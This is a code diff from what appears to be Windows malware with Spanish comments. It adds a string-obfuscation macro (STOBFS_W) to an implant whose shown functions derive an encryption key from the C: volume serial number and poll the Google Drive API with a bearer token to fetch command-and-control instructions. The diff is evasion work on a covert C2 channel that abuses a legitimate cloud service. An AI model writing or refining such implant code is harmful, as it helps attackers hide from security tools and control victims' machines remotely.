@@ -31,7 +31,7 @@ static C2_CONFIG g_C2 = {
 static void DeriveHostKey(uint8_t *key) {
     WCHAR volumeName[MAX_PATH];
     DWORD serialNumber = 0;
-    GetVolumeInformationW(L"C:\\", volumeName, MAX_PATH, &serialNumber, NULL, NULL, NULL, 0);
+    GetVolumeInformationW(STOBFS_W(L"C:\\"), volumeName, MAX_PATH, &serialNumber, NULL, NULL, NULL, 0);
     
     // Usar el serial del disco como semilla para la clave
     for (int i = 0; i < 32; i++) {
@@ -52,16 +52,16 @@ static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
     
     BOOL success = FALSE;
     if (SUCCEEDED(hr)) {
-        BSTR bstrMethod = SysAllocString(L"GET");
-        BSTR bstrUrl = SysAllocString(L"https://www.googleapis.com/drive/v3/files?pageSize=1");
+        BSTR bstrMethod = SysAllocString(STOBFS_W(L"GET"));
+        BSTR bstrUrl = SysAllocString(STOBFS_W(L"https://www.googleapis.com/drive/v3/files?pageSize=1"));
         VARIANT varAsync; VariantInit(&varAsync);
         varAsync.vt = VT_BOOL;
         varAsync.boolVal = VARIANT_FALSE;
 
         hr = pRequest->Open(bstrMethod, bstrUrl, varAsync);
         if (SUCCEEDED(hr)) {
-            LPCWSTR decryptedToken = L"Bearer [REAL_TOKEN_DESCIFRADO]";
-            BSTR bstrHeader = SysAllocString(L"Authorization"); BSTR bstrValue = SysAllocString(decryptedToken); pRequest->SetRequestHeader(bstrHeader, bstrValue); SysFreeString(bstrHeader); SysFreeString(bstrValue);
+            LPCWSTR decryptedToken = STOBFS_W(L"Bearer [REAL_TOKEN_DESCIFRADO]");
+            BSTR bstrHeader = SysAllocString(STOBFS_W(L"Authorization")); BSTR bstrValue = SysAllocString(decryptedToken); pRequest->SetRequestHeader(bstrHeader, bstrValue); SysFreeString(bstrHeader); SysFreeString(bstrValue);
 
             VARIANT varEmpty; VariantInit(&varEmpty);
             hr = pRequest->Send(varEmpty);
